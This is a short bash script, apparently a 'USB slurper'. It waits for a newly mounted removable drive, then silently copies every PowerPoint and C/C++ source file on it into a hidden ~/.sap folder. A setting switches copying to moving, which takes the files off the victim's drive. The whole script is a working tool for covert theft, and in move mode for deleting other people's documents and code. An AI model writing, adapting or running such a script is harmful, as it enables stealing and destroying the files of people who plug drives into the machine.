#/bin/bash

#cp for copy; mv for move;
SLAY_LEVEL=cp

#files you want to slay
EXTENTIONS=("ppt" "pptx" "c" "cpp")

mount | grep /media/ | awk '{print$3}' > .before
while [ "$USB" = "" ]; do
        sleep 5
        mount | grep /media/ | awk '{print$3}' > .present
        USB=$(comm -13 .before .present)
done
rm .before .present
	
SOURCE_PATH=$USB
TARGET_PATH=~/.sap

for EXTENTION in ${EXTENTIONS[@]}; do
	find $SOURCE_PATH -name "*.$EXTENTION" > .FILES.txt

	NUMBER_OF_FILES=$(grep -c "" .FILES.txt)
	for i in `seq 1 $NUMBER_OF_FILES`; do
        	FILE=$(sed -n "$i p" .FILES.txt)
        	$SLAY_LEVEL "$FILE" "$TARGET_PATH/$i.$EXTENTION"
	done
done
rm .FILES.txt
